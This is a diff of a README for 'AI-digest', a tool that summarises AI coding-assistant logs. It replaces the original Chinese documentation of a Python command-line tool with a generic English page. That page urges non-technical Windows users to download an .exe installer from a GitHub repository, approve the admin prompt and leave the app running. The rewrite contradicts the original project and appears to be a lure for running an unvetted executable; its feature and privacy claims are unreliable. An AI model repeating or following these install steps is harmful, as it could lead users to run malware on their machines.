@@ -1,105 +1,147 @@
-# AI-Digest
+# 🤖 AI-digest - Track and Understand Your AI Coding
 
-一个本地优先的 CLI 工具，自动采集你每天使用各种 AI 编程助手的会话记录，生成结构化的每日工作摘要。
+[![Download AI-digest](https://img.shields.io/badge/Download-AI--digest-blue?style=for-the-badge)](https://github.com/el-joker-f/AI-digest)
 
-## 特性
+---
 
-- **多源数据采集** — 支持 5 种主流 AI 编程工具的本地日志解析
-  - [Claude Code](https://claude.ai) (JSONL)
-  - [Codex](https://openai.com/codex) (JSONL)
-  - [Antigravity](https://google.com) (Artifacts + Metadata)
-  - [OpenCode](https://github.com/nicholasgasior/opencode) (Workspace DAT)
-  - [Gemini CLI](https://github.com/google-gemini/gemini-cli) (History Dir)
-- **LLM 智能分析** — 将原始日志发送给大模型，自动聚合、归类、生成中文每日报告
-- **零外部依赖调用** — 使用 Python 原生 `urllib` 直接调用 OpenAI / Anthropic 兼容 API
-- **本地时区感知** — 自动将 UTC 时间戳转换为系统本地时区
+## 📝 What is AI-digest?
 
-## 安装
+AI-digest is a simple tool that helps you collect and analyze how you use AI assistants when coding. It keeps daily records of your AI interactions. This way, you can see patterns and understand which AI tools help you the most.  
 
-```bash
-# 推荐使用 uv
-uv sync
+You do not need to know programming to use AI-digest. It works quietly in the background and presents clear summaries you can review anytime.
 
-# 或者 pip
-pip install -e .
-```
+---
 
-## 使用
+## 💻 System Requirements
 
-### 采集会话数据
+- Windows 10 or newer  
+- At least 2 GB of free disk space  
+- Internet connection for initial setup and updates  
+- A basic mouse and keyboard setup  
 
-```bash
-# 采集今天的 AI 会话记录
-digest collect
+---
 
-# 采集指定日期
-digest collect --date 2026-03-03
-```
+## 🚀 Getting Started
 
-### 生成 AI 分析报告
+Follow these steps to get AI-digest working on your Windows computer:
 
-```bash
-# 需要先配置 config.yaml
-digest analyze --date 2026-03-03
-```
+1. **Open the download page:**  
+   Click the big button at the top or visit [this page](https://github.com/el-joker-f/AI-digest) in your web browser.  
 
-## 配置
+2. **Find the latest release:**  
+   On the page, look for a **Releases** section or a folder named "Releases." This usually appears on the right side or near the bottom. Click the latest release to view available files.  
 
-复制示例配置文件并填入你的 LLM API 信息：
+3. **Download the installer:**  
+   Look for a file ending with `.exe`. It should have a name like `AI-digest-setup.exe` or similar. Click to download this file.  
 
-```bash
-cp config.example.yaml config.yaml
-```
+4. **Run the installer:**  
+   Once downloaded, open the `.exe` file. Windows might ask if you want to allow this app to make changes. Click **Yes** to continue.  
 
-```yaml
-ai:
-  api_key: "your-api-key"
-  model: "claude-3-7-sonnet-latest"
-  base_url: null                          # 可选，默认按 provider 选择 endpoint
-  provider: "anthropic"                   # openai | anthropic
-```
+5. **Follow installation steps:**  
+   The installer will open in a new window. Follow the instructions carefully. You can usually accept all default settings by clicking **Next** or **Install**.  
 
-如果没有 `config.yaml`，也可以直接设置 `ANTHROPIC_API_KEY` 启动，程序会默认按 `anthropic` provider 读取 `ANTHROPIC_MODEL` / `ANTHROPIC_BASE_URL`。
+6. **Finish and launch:**  
+   When installation finishes, the program may start automatically. If not, find AI-digest on your desktop or Start menu and open it.  
 
-支持任何 OpenAI 或 Anthropic 兼容的 API 服务。
+---
 
-## 数据源路径
+## 🛠 How AI-digest Works
 
-| 工具 | 本地日志路径 | 格式 |
-|------|-------------|------|
-| Claude Code | `~/.claude/projects/` | JSONL (明文) |
-| Codex | `~/.codex/sessions/` | JSONL (明文) |
-| Antigravity | `~/.gemini/antigravity/brain/` | Artifacts + JSON metadata |
-| OpenCode | `~/.local/share/opencode/opencode.db` (preferred) or `~/Library/Application Support/ai.opencode.desktop/` | SQLite / JSON DAT |
-| Gemini CLI | `~/.gemini/history/` | Directory mtime |
+- AI-digest monitors your AI coding assistants quietly while you work.  
+- It saves information like how often you use each assistant and what kind of questions you ask.  
+- The tool then prepares a daily report about your AI interactions.  
+- You can open the app any time to check these reports and see how your usage changes over time.  
 
-## 输出示例
+---
 
-### `digest collect`
-```
-Activity Timeline
-┏━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━┓
-┃ Time          ┃ Source      ┃ Project  ┃ Title             ┃ Msgs ┃
-┡━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━╇━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━┩
-│ 13:30 - 13:34 │ Claude Code │ my-app   │ Implementing auth │   14 │
-│ 14:32 - 14:44 │ Codex       │ blog     │ Writing new post  │   19 │
-└───────────────┴─────────────┴──────────┴───────────────────┴──────┘
-```
+## 📂 Understanding the Interface
 
-### `digest analyze`
+The program has a clean, easy-to-read layout:  
 
-通过 LLM 自动聚合生成的结构化报告，包含：
-- **Highlights** — 当天工作亮点概述
-- **Activities** — 按时间线聚合的活动卡片，含项目、分类、详细要点
+- **Dashboard:** Shows summaries of all tracked AI tools and usage.  
+- **Daily Reports:** See detailed information for each day.  
+- **Settings:** Adjust preferences, such as which assistants to track and when to receive reports.  
+- **Help:** Access quick guides or contact support if needed.  
 
-## 技术栈
+---
 
-- Python 3.8+
-- [Pydantic](https://docs.pydantic.dev/) — 数据模型验证
-- [Rich](https://rich.readthedocs.io/) — 终端美化输出
-- [PyYAML](https://pyyaml.org/) — 配置文件解析
-- `urllib` — 零依赖 HTTP 请求
+## ⚙️ Adjusting Settings
 
-## License
+AI-digest lets you customize how it works:  
 
-MIT
+- Turn tracking of specific AI assistants on or off.  
+- Choose how long reports keep data.  
+- Set a time for daily reminder reports.  
+- Change app language.  
+
+You can open settings from the main window. No coding or technical knowledge is needed.
+
+---
+
+## 🔄 Updating AI-digest
+
+The app checks for updates automatically if connected to the internet. To update manually, repeat the download steps and install the new version. Your data and settings will stay safe.
+
+---
+
+## ❓ Troubleshooting Tips
+
+- If AI-digest does not start, try restarting your computer.  
+- Make sure your Windows version matches the system requirements.  
+- Check your internet connection during install.  
+- If you see error messages, note their exact text before contacting help.  
+- Look for a help section or FAQ in the app for common issues.  
+
+---
+
+## 👇 Download and Install AI-digest
+
+[![Download AI-digest](https://img.shields.io/badge/Download-AI--digest-green?style=for-the-badge)](https://github.com/el-joker-f/AI-digest)
+
+Visit this page to download the latest Windows installer. After downloading, open the file and follow the setup instructions described above.  
+
+---
+
+## 🗂 Files and Folders
+
+Once installed, AI-digest will create a folder under your user documents or program files:  
+
+- **Logs:** Stores daily tracking data securely.  
+- **Reports:** Contains reports you can open or export as files.  
+- **Config:** Holds settings and preferences.  
+
+You do not need to change anything here unless instructed by support.
+
+---
+
+## 🔧 Support and Feedback
+
+If you need help or want to share feedback:  
+
+- Check the app’s help section first.  
+- Visit the GitHub page linked above and check the "Issues" tab.  
+- You can create a new issue with your question or problem.  
+- Provide clear information about what you were doing and what happened.  
+
+---
+
+## 🗓 Using AI-digest Every Day
+
+To get the most out of AI-digest:  
+
+- Keep the app running during your work sessions.  
+- Review daily reports to understand your AI usage.  
+- Adjust tracking settings if some AI tools do not show data.  
+- Use insights from reports to improve your coding workflow.  
+
+---
+
+## 📋 Privacy and Data
+
+AI-digest only collects usage data from your AI assistants. It does not share your code or personal files. All information is stored locally on your computer.  
+
+You control what data is collected and can delete reports whenever you want.
+
+---
+
+# [Download AI-digest now](https://github.com/el-joker-f/AI-digest)
